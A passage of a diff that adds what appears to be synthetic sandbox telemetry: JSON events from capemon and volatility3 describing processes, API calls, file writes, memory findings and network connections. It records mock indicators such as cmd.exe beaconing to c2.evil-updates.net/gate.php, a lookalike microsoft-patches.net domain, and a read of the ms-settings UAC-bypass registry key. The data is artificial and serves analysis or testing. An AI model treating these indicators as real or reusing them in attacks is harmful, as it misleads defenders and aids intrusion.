+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "43b9e31fec6a5436be509ed8",
+  "time": "2026-10-13T15:40:26.323Z",
+  "sequence": 169,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-deleted",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "explorer.exe deleted C:\\Users\\Analyst\\AppData\\Local\\Temp\\svc_helper.dll",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\svc_helper.dll",
+  "registry_path": null
+ },
+ {
+  "id": "0aba0aba2c9da1beb5711407",
+  "time": "2026-10-13T15:40:26.448Z",
+  "sequence": 170,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "notepad.exe wrote C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "registry_path": null
+ },
+ {
+  "id": "5fb25c9c033ab559f2285390",
+  "time": "2026-10-13T15:40:26.494Z",
+  "sequence": 171,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "e5ccd6bb02daeb1e65ccc76a",
+  "time": "2026-10-13T15:40:26.521Z",
+  "sequence": 172,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "29a69ba35b0a98b55be4858b",
+  "time": "2026-10-13T15:40:26.749Z",
+  "sequence": 173,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in benign.exe at 0x7ff60fe29000",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "32f7a6353c62791a0325e2b6",
+  "time": "2026-10-13T15:40:26.909Z",
+  "sequence": 174,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "notepad.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "459176095ffe74be72f86489",
+  "time": "2026-10-13T15:40:27.260Z",
+  "sequence": 175,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe read HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)"
+ },
+ {
+  "id": "189621cffadc86ceacc5fdfb",
+  "time": "2026-10-13T15:40:27.396Z",
+  "sequence": 176,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "53795ca420ca300698ea7345",
+  "time": "2026-10-13T15:40:27.665Z",
+  "sequence": 177,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "cmd.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "e256eeb3410c7e7461027f35",
+  "time": "2026-10-13T15:40:27.697Z",
+  "sequence": 178,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe connected to c2.evil-updates.net:8080",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.34",
+   "port": 8080,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": null,
+  "url": "http://c2.evil-updates.net/gate.php?id=8925",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "4fc01957578b72efbd3bc84a",
+  "time": "2026-10-13T15:40:27.906Z",
+  "sequence": 179,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "cacf7c0ffd0d604cd4dc5725",
+  "time": "2026-10-13T15:40:27.940Z",
+  "sequence": 180,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "svchost.exe connected to time.windows.com:443",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.44",
+   "port": 443,
+   "domain": "time.windows.com"
+  },
+  "dns_query": null,
+  "url": "https://time.windows.com/gate.php?id=5775",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "637df1093d25d47c7f114249",
+  "time": "2026-10-13T15:40:28.191Z",
+  "sequence": 181,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "d9cbdbd7a419ef76af43ab76",
+  "time": "2026-10-13T15:40:28.547Z",
+  "sequence": 182,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "620db5a82b63d66ec25ad01a",
+  "time": "2026-10-13T15:40:28.572Z",
+  "sequence": 183,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "cfc220d4d7c12df658d0ea8f",
+  "time": "2026-10-13T15:40:28.646Z",
+  "sequence": 184,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "CryptAcquireContextW",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called CryptAcquireContextW \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "CryptAcquireContextW",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "001adaf4dcdb36c77ae3bf14",
+  "time": "2026-10-13T15:40:28.797Z",
+  "sequence": 185,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in explorer.exe at 0x7ff66c1bd000",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "88ae3455ed1c1d5a6da74cbb",
+  "time": "2026-10-13T15:40:28.896Z",
+  "sequence": 186,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in cmd.exe at 0x7ff63e7fa000",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "17c098e5d31306f9ba9e1dee",
+  "time": "2026-10-13T15:40:28.943Z",
+  "sequence": 187,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "2ebcffd974f63f9a024f55a8",
+  "time": "2026-10-13T15:40:29.159Z",
+  "sequence": 188,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtDelayExecution",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtDelayExecution \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtDelayExecution",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a2a83aa434dac4ae46f4dffa",
+  "time": "2026-10-13T15:40:29.572Z",
+  "sequence": 189,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe resolved update-cdn.microsoft-patches.net \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "update-cdn.microsoft-patches.net"
+  },
+  "dns_query": "update-cdn.microsoft-patches.net",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "17a901a095140d94b96bfe53",
+  "time": "2026-10-13T15:40:29.810Z",
+  "sequence": 190,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "notepad.exe connected to tartarus-selftest.example:443",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.48",
+   "port": 443,
+   "domain": "tartarus-selftest.example"
+  },
+  "dns_query": null,
+  "url": "https://tartarus-selftest.example/gate.php?id=9277",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "3b3cee0942266c0d7d02955c",
+  "time": "2026-10-13T15:40:30.041Z",
+  "sequence": 191,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryValueKey",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtQueryValueKey \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtQueryValueKey",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "18593149966357bd89a058a1",
+  "time": "2026-10-13T15:40:30.361Z",
+  "sequence": 192,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-read",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe read C:\\Users\\Public\\Libraries\\payload.bin",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Public\\Libraries\\payload.bin",
+  "registry_path": null
+ },
+ {
+  "id": "42789070ab422760a49ade17",
+  "time": "2026-10-13T15:40:30.382Z",
+  "sequence": 193,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9a3a40e8a0398c2809e0ba1c",
+  "time": "2026-10-13T15:40:30.772Z",
+  "sequence": 194,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "feb23d256956b672558acb22",
+  "time": "2026-10-13T15:40:30.903Z",
+  "sequence": 195,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtAllocateVirtualMemory",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtAllocateVirtualMemory \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtAllocateVirtualMemory",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "e6a4ded21e0cc0a735d5ec10",
+  "time": "2026-10-13T15:40:30.947Z",
+  "sequence": 196,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "GetSystemTimeAsFileTime",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called GetSystemTimeAsFileTime \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "GetSystemTimeAsFileTime",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "ab19aee9b33b43f6a5ba7909",
+  "time": "2026-10-13T15:40:31.204Z",
+  "sequence": 197,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9c1f1523c2c1af0d8bc24e65",
+  "time": "2026-10-13T15:40:31.318Z",
+  "sequence": 198,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "explorer.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "1780bfb1bb219a654bf96119",
+  "time": "2026-10-13T15:40:31.519Z",
+  "sequence": 199,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "f2783a7c46b4c8544a826dd5",
+  "time": "2026-10-13T15:40:31.737Z",
+  "sequence": 200,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a70da83e6ea5b56f924946f8",
+  "time": "2026-10-13T15:40:32.080Z",
+  "sequence": 201,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-read",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe read C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "registry_path": null
+ },
+ {
+  "id": "4af24a17d904c977a3e95e55",
+  "time": "2026-10-13T15:40:32.496Z",
+  "sequence": 202,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe connected to www.msftconnecttest.com:8080",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.42",
+   "port": 8080,
+   "domain": "www.msftconnecttest.com"
+  },
+  "dns_query": null,
+  "url": "http://www.msftconnecttest.com/gate.php?id=2287",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "f44f12782a22be17aeeb5cfc",
+  "time": "2026-10-13T15:40:32.753Z",
+  "sequence": 203,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "svchost.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "008b8ccf1cb6bcb3081a4b8c",
+  "time": "2026-10-13T15:40:32.805Z",
+  "sequence": 204,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "257bfb9627ef9c82f76855f7",
+  "time": "2026-10-13T15:40:32.974Z",
+  "sequence": 205,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "svchost.exe resolved www.msftconnecttest.com \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "www.msftconnecttest.com"
+  },
+  "dns_query": "www.msftconnecttest.com",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "eb61bde77c5417ce7db8ad61",
+  "time": "2026-10-13T15:40:33.288Z",
+  "sequence": 206,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe connected to time.windows.com:443",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.44",
+   "port": 443,
+   "domain": "time.windows.com"
+  },
+  "dns_query": null,
+  "url": "https://time.windows.com/gate.php?id=401",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "97b068c7367fd73ef8c5ebc6",
+  "time": "2026-10-13T15:40:33.387Z",
+  "sequence": 207,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "CryptAcquireContextW",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called CryptAcquireContextW \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "CryptAcquireContextW",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "20b8c0a55ebef3978baa2225",
+  "time": "2026-10-13T15:40:33.559Z",
+  "sequence": 208,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe connected to tartarus-selftest.example:8080",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.22",
+   "port": 8080,
+   "domain": "tartarus-selftest.example"
+  },
+  "dns_query": null,
+  "url": "http://tartarus-selftest.example/gate.php?id=64",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "cb72af4dba77f67fef96a7bb",
+  "time": "2026-10-13T15:40:33.652Z",
+  "sequence": 209,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "GetSystemTimeAsFileTime",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called GetSystemTimeAsFileTime \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "GetSystemTimeAsFileTime",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "14e60e039feb5bb371e54a82",
+  "time": "2026-10-13T15:40:33.698Z",
+  "sequence": 210,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "explorer.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0ff88a66fc304591474ab307",
+  "time": "2026-10-13T15:40:33.879Z",
+  "sequence": 211,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryValueKey",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtQueryValueKey \u2192 STATUS_SUCCESS",
